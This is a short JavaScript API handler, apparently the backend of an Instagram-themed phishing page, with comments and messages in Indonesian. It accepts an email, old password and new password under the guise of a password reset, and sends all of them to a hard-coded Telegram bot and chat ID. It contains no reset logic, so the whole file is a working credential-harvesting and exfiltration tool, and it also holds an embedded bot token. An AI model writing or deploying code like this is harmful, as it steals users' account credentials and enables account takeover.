export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Metode tidak diizinkan' });
  }

  const { email, oldPass, newPass } = req.body;

  if (!email || !oldPass || !newPass) {
    return res.status(400).json({ message: 'Data tidak lengkap' });
  }

  // Token dan Chat ID langsung ditulis
  const botToken = '8005969343:AAH906NhVkByakkeBW4HIspe7CutjlZF2qk'; // Ganti token bot kamu
  const chatId = '7721157555'; // Ganti chat ID tujuan

  const message = `
🔐 *Reset Password Instagram*
👤 Email: \`${email}\`
🔑 Password Lama: \`${oldPass}\`
🆕 Password Baru: \`${newPass}\`
  `.trim();

  try {
    const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const result = await telegramRes.json();

    if (!telegramRes.ok || !result.ok) {
      console.error('Telegram API error:', result);
      return res.status(500).json({ message: result.description || 'Gagal mengirim ke Telegram' });
    }

    return res.status(200).json({ message: 'Berhasil' });
  } catch (error) {
    console.error('Fetch error:', error);
    return res.status(500).json({ message: 'Terjadi kesalahan saat mengirim ke Telegram' });
  }
}
